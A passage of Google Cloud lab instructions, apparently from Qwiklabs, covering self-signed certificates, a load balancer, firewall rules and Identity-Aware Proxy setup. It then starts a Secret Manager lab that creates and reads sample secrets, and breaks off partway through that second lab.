class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">openssl x509 -req \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -signkey PRIVATE_KEY_FILE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -in CSR_FILE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -out CERTIFICATE_FILE.pem \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -extfile ssl_config \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -extensions extension_requirements \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> -days 365</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='create-a-self-managed-ssl-certificate-resource'><span>Create a self-managed SSL certificate resource</span></h3><p><span>Before you can create a Google Cloud SSL certificate resource, you must have a private key and certificate.</span></p><ol start='' ><li><p><span>To create a global SSL certificate, use the </span><a href='https://cloud.google.com/sdk/gcloud/reference/compute/ssl-certificates/create'><code>gcloud compute ssl-certificates create</code></a><span> command with the </span><code>--global</code><span> flag:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssl-certificates create my-cert \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> --certificate=CERTIFICATE_FILE.pem \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> --private-key=PRIVATE_KEY_FILE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> --global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the </span><strong><span>Authorize Cloud Shell</span></strong><span> prompt, click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><h2 id='task-4-create-a-load-balancer'><span>Task 4. Create a load balancer</span></h2><p><span>In this task you create a load balancer. HTTP(S) Load Balancing is implemented on Google Front End (GFE). GFEs are distributed globally and operate together using Google&#39;s global network and control plane.</span></p><p><span>To set up a load balancer, your VMs must be in an instance group, which you created in the previous tasks.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click on </span><strong><span>View All Products</span></strong><span> and click </span><strong><span>Network services &gt; Load balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Load Balancer</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Application Load Balancer (HTTP/S)</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Under Public facing or internal only</span></strong><span>, select </span><strong><span>Public facing (external)</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Global or single region deployment</span></strong><span>, select </span><strong><span>Best for global workloads</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Load balancer generation</span></strong><span>, select </span><strong><span>Global external Application Load Balancer</span></strong><span>, click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Configure</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Load Balancer Name</span></strong><span>, type </span><strong><span>my-load-balancer</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Backend Configuration</span></strong><span> &gt; </span><strong><span>Backend services &amp; backend buckets &gt; Create a Backend Service</span></strong><span>.</span></p></li><li><p><span>On the </span><strong><span>Create backend service</span></strong><span> panel, for </span><strong><span>Name</span></strong><span>, type </span><strong><span>my-backend-service</span></strong><span>.</span>
<span>You must use the exact name </span><em><span>my-backend-service</span></em><span>. If you use a different name, the startup script on your VMs won&#39;t be able to find the correct Backend Service ID to authenticate requests.</span></p></li><li><p><span>In </span><strong><span>New backend</span></strong><span>, specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><strong><span>my-managed-instance-group</span></strong></td></tr><tr><td style='text-align:left;' ><span>Port Numbers</span></td><td style='text-align:left;' ><strong><span>80</span></strong></td></tr></tbody></table></figure><ol start='' ><li><p><span>Uncheck </span><strong><span>Enable Cloud CDN</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Health check</span></strong><span>, click </span><strong><span>Create a Health Check</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>my-health-check</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Protocol</span></strong><span>, select </span><strong><span>HTTP</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>The Create global external Application Load balancer pane reappears.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Frontend configuration</span></strong><span>. Specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><strong><span>Https (includes HTTP/2 and HTTP/3)</span></strong></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Click </span><strong><span>Ephemeral</span></strong><span>, and then select </span><strong><span>Create IP address</span></strong></td></tr><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>Type </span><strong><span>static-ip</span></strong><span>, and then click </span><strong><span>Reserve</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Certificate</span></td><td style='text-align:left;' ><strong><span>my-cert</span></strong></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><span>The Create global external Application Load balancer pane reappears.</span></p><ol start='' ><li><p><span>In </span><strong><span>Create global external Application Load Balancer</span></strong><span>, click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>The </span><strong><span>Load balancing</span></strong><span> page appears and your new load balancer will be created in the list of load balancers.</span></p><ol start='' ><li><p><span>When the Cloud console finishes creating the new load balancer, click the name of the load balancer and note the external IP address under </span><strong><span>Details &gt; Frontend</span></strong><span>. You will need it in task 7.</span></p></li></ol><h2 id='task-5-restart-your-vms'><span>Task 5. Restart your VMs</span></h2><p><span>In this task you restart the VMs in your MIG so that they can correctly authenticate requests from IAP.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Compute Engine &gt; Instance groups</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>my-managed-instance-group</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Restart/Replace VMs</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Operation</span></strong><span>, click </span><strong><span>Restart</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Instances</span></strong><span>, type </span><strong><span>3</span></strong></p></li><li><p><span>For </span><strong><span>Minimum wait time</span></strong><span>, type </span><strong><span>0</span></strong></p></li><li><p><span>Click </span><strong><span>Restart VMs</span></strong><span>.</span></p></li></ol><h2 id='task-6-set-up-iap'><span>Task 6. Set up IAP</span></h2><h3 id='configure-your-firewall'><span>Configure your firewall</span></h3><p><span>In this task you configure your firewall to block access to the underlying VMs and only allow access through IAP.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>default-allow-internal</span></strong><span> checkbox.</span></p></li><li><p><span>Click </span><strong><span>Delete</span></strong><span>, and then select </span><strong><span>Delete</span></strong><span> to confirm it.</span></p></li><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>. Specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><strong><span>allow-iap-traffic</span></strong></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><strong><span>All instances in the network</span></strong></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><strong><span>130.211.0.0/22, 35.191.0.0/16</span></strong><span> (Press </span><strong><span>Enter</span></strong><span> after you paste each value in the box)</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><strong><span>Specified protocols and ports</span></strong></td></tr><tr><td style='text-align:left;' ><span>TCP</span></td><td style='text-align:left;' ><strong><span>80</span></strong></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h3 id='set-up-iap'><span>Set up IAP</span></h3><p><span>In this step you set up IAP for your project.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Security &gt; Identity-Aware Proxy</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Enable API</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Go to Identity Aware Proxy</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Configure Consent Screen</span></strong><span>.</span></p></li></ol><p><strong><span>Caution:</span></strong><span> Don&#39;t enter any confidential information on the OAuth consent screen. Any information you save to the OAuth consent screen may be publicly visible for anyone who accesses your URL. Email and product details are displayed on the login screen and when someone tries to access a resource for which they don&#39;t have permission.</span></p><ol start='' ><li><p><span>In </span><strong><span>User Type</span></strong><span>, select </span><strong><span>External</span></strong><span> , and then click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>App name</span></strong><span> , type </span><strong><span>IAP</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>User support email</span></strong><span>, select the student account. This has the value of </span><strong><span>student-00-</span><span>*</span><span>*</span></strong><strong><span>*</span></strong><span>@qwiklabs.net**.</span></p></li><li><p><span>For </span><strong><span>Developer contact information</span></strong><span>, copy and paste the student account </span><strong><span>Username</span></strong><span> from the lab window. This matches the value in the previous step.</span></p></li><li><p><span>Click </span><strong><span>Save and Continue</span></strong><span> three times, and then select </span><strong><span>Back to Dashboard</span></strong><span>.</span></p></li></ol><p><span>To change information on the OAuth consent screen later, such as the product name or email address, repeat the preceding steps to configure the consent screen.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Security &gt; Identity-Aware Proxy</span></strong><span>.</span></p></li><li><p><span>Next to </span><strong><span>my-backend-service</span></strong><span>, toggle the </span><strong><span>on/off</span></strong><span> switch in the </span><strong><span>IAP</span></strong><span> column.</span></p></li><li><p><span>In the </span><strong><span>Turn on IAP</span></strong><span> dialog, select the checkbox to confirm you have read the configuration requirements.</span></p></li><li><p><span>Click </span><strong><span>Turn On</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If you see an error, click on the error. If you are then prompted to add a firewall rule, edit the rule you created previously to include the port number mentioned in the error.</span></p><p><img src="images\CnuKGBfAR0ciG6Y8%2FIiBtIqq4%2F9VIZULJ4OPfkugcXI%3D" referrerpolicy="no-referrer" alt="IAP Status Error"></p><p><span>Confirm that OAuth Consent has been set up.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='add-principals-to-the-access-list'><span>Add principals to the access list</span></h3><p><span>In this step you add principals to the IAP access list for your project.</span></p><ol start='' ><li><p><span>In </span><strong><span>Identity-Aware Proxy</span></strong><span>, select the </span><strong><span>my backend-service</span></strong><span> checkbox.</span></p></li><li><p><span>Click </span><strong><span>Add Principal</span></strong><span>.</span></p></li><li><p><span>To grant access to yourself, in </span><strong><span>New Principals</span></strong><span>, copy and paste your qwiklabs </span><strong><span>Username</span></strong><span> from the lab credentials pane.</span></p></li><li><p><span>Select the Role of </span><strong><span>Cloud IAP &gt; IAP-secured Web App User</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><span>Confirm principal to access the application by configuring IAM.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-7-test-iap'><span>Task 7. Test IAP</span></h2><p><span>In the task, you run a curl command to test access your external load balancer, and then verify that it is protected by IAP.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click on </span><strong><span>View All Products</span></strong><span> and click </span><strong><span>Network services &gt; Load balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Frontends</span></strong><span>.</span></p></li><li><p><span>On the Google Cloud console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Cloud Shell"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Run the following curl command, replacing </span><strong><span>Load Balancer External IP address</span></strong><span> with the External IP address of your load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -kvi https://&lt;Load Balancer External IP address&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> If an IAP generated response that is true is displayed, you have successfully configured IAP for your Compute Engine instance.</span></p><p><img src="images\%2B8BGFlQ0poDBDVFYybNtKLNKeZ750MBulj7A62K8szE%3D" referrerpolicy="no-referrer" alt="Successfully Configured Message"></p><ol start='' ><li><p><span>Scroll up the console page and locate the </span><strong><span>Http/2 302</span></strong><span> redirection to accounts.google.com.</span></p></li><li><p><span>Click on the </span><strong><span>location</span></strong><span> link.</span></p></li></ol><p><span>The link opens to the </span><strong><span>Google account integrated authentication</span></strong><span> page.</span></p><p><img src="images\%2Fk6O4TB5nHs5ZbW15%2Bt8U2DkUQUAYmLGGMpUVekbuTw%3D" referrerpolicy="no-referrer" alt="Google account integrated authentication dialog"></p><p><strong><span>Note:</span></strong><span> Because you used a self-signed cert, you cannot access the application itself. However, this confirms that IAP is configured and is protecting traffic.</span></p><p><span>Confirm restrict access with IAP.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='congratulations-16'><span>Congratulations!</span></h2><p><span>You have successfully used IAP to secure a web application running on a Compute Engine instance.</span></p><p><span>In this lab, you learned how to:</span></p><ul><li><p><span>Create an instance template.</span></p></li><li><p><span>Create an instance group.</span></p></li><li><p><span>Create a self-signed certificate.</span></p></li><li><p><span>Create a load balancer.</span></p></li><li><p><span>Configure an Oauth consent screen.</span></p></li><li><p><span>Grant access to the application using IAP.</span></p></li></ul><p>&nbsp;</p><h2 id='lab---configuring-and-using-credentials-with-secret-manager'><span>LAB - Configuring and Using Credentials with Secret Manager</span></h2><h2 id='overview-19'><span>Overview</span></h2><p><span>In this lab, you use </span><a href='https://cloud.google.com/secret-manager/docs/quickstart'><span>Secret Manager</span></a><span> from Cloud Console and the Command Line Interface (CLI) to create and use a secret, replace a secret, and finally, reinstate an older version of a secret.</span></p><p><span>Secret Manager is available in Cloud Console. It is also available from the command line using the CLI or from a program, using the REST API or one of the supported Software Development Kits (SDKs). Supported SDKs include C#, Go, Node.js, Java, etc. A complete list of available </span><a href='https://cloud.google.com/secret-manager/docs/reference/libraries'><span>SDKs</span></a><span>. Information regarding the </span><a href='https://cloud.google.com/secret-manager/docs/reference/rest'><span>REST API</span></a><span>.</span></p><h2 id='objectives-16'><span>Objectives</span></h2><p><span>In this lab, you learn to:</span></p><ul><li><p><span>Enable the Secret Manager API.</span></p></li><li><p><span>Create and use a new secret.</span></p></li><li><p><span>Create a new version of a secret, and disable the old version(s).</span></p></li><li><p><span>Reinstate and verify an older version of a secret.</span></p></li></ul><h2 id='setup-and-requirements-16'><span>Setup and requirements</span></h2><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h2 id='task-1-enable-the-secret-manager-api'><span>Task 1. Enable the Secret Manager API</span></h2><p><span>In this task, you enable the Secret Manager API.</span></p><p><span>Before you access Secret Manager, you must first enable its API. If you fail to do so, when you attempt to access its features, you will receive an error.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span>, Select </span><strong><span>API &amp; Services</span></strong><span>.</span></p></li><li><p><span>At the top of the page, click </span><strong><span>+ Enable API and Services</span></strong><span>.</span></p></li><li><p><span>In the search box, enter </span><code>Secret Manager</code><span>. You should see one result - the Secret Manager API.</span></p></li><li><p><span>Click </span><strong><span>Secret Manager API</span></strong><span>. On the resulting page, click </span><strong><span>Enable</span></strong><span>. If no error occurs - and you see a page with information about this API, you were successful.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Enable the Secret Manager API</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-create-a-secret'><span>Task 2. Create a secret</span></h2><p><span>In this task, you create a secret and add the secret value to the password.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span>, select </span><strong><span>Security &gt; Secret Manager</span></strong><span>.</span></p></li><li><p><span>On the Secret Manager main page, click </span><strong><span>+ Create Secret</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Name</span></strong><span>, enter </span><code>password</code><span>.</span></p></li><li><p><span>For the </span><strong><span>Secret value</span></strong><span>, enter </span><code>xyzpdq</code><span>.</span></p></li><li><p><span>Click </span><strong><span>+ Add Label</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Key</span></strong><span>, enter </span><code>team</code><span>.</span></p></li><li><p><span>For the </span><strong><span>Value</span></strong><span>, enter </span><code>acme</code><span>.</span></p></li><li><p><span>Leave all other values at their default setting, and click </span><strong><span>Create Secret</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a secret</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-3-use-a-secret'><span>Task 3. Use a secret</span></h2><p><span>In this task, you use the secrets command to verify the value of the password secret.</span></p><ol start='' ><li><p><span>On the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/qhDJ0%2BK1c11zEtHLRFXqsSZQIzDeh4AaNQ7qlalvLt4%3D" referrerpolicy="no-referrer" alt="Activate cloud shell icon"><span>) to open Cloud Shell.</span></p></li><li><p><span>At the bottom of the page, click </span><strong><span>Continue</span></strong><span>. Wait for the Google Cloud Shell machine to provision.</span></p></li><li><p><span>At the Cloud Shell Terminal command line, enter:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud secrets versions access 1 --secret="password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If successful, you should see that the value of the password secret (</span><code>xyzpdq</code><span>) is returned at the beginning of the next line, immediately before the command line prompt, similar to what is shown below:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student_00_7413964b6ab0@cloudshell:~ (qwiklabs-gcp-00-f575f732b85b)$ gcloud secrets versions access 1 --secret="</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">password"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">xyzpdqstudent_00_7413964b6ab0@cloudshell:~ (qwiklabs-gcp-00-f575f732b85b)$</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h2 id='task-4-create-and-use-a-new-secret-version'><span>Task 4. Create and use a new secret version</span></h2><p><span>In this task, you create a new version 2 secret and use the secrets command to verify the version 2 value of the password secret.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> of Google Cloud Console, select </span><strong><span>Security &gt; Secret Manager</span></strong><span>. The Secret Manager page shows information about the password secret that you created earlier.</span></p></li><li><p><span>Under </span><strong><span>Actions</span></strong><span>, click the More actions menu (i.e., the “three dots” menu) and then click </span><strong><span>Add New Version</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Secret value</span></strong><span>, enter </span><code>abc123</code><span>.</span></p></li><li><p><span>Leave all other values at their default setting, and click </span><strong><span>Add New Version</span></strong><span>.</span></p></li></ol><p><span>Now, 